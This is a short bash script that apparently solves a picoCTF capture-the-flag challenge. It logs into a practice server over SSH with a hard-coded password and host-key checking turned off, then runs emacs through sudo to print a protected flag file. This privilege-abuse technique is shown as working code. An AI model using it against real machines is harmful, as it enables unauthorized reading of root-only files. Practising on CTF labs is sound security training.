#!/bin/bash

sshpass -p f99cd115 ssh -o StrictHostKeyChecking=no ctf-player@green-hill.picoctf.net -p $1 << EOF | grep "picoCTF" > flag.txt
sudo emacs --batch -visit flag.txt -eval '(princ (buffer-string))'
EOF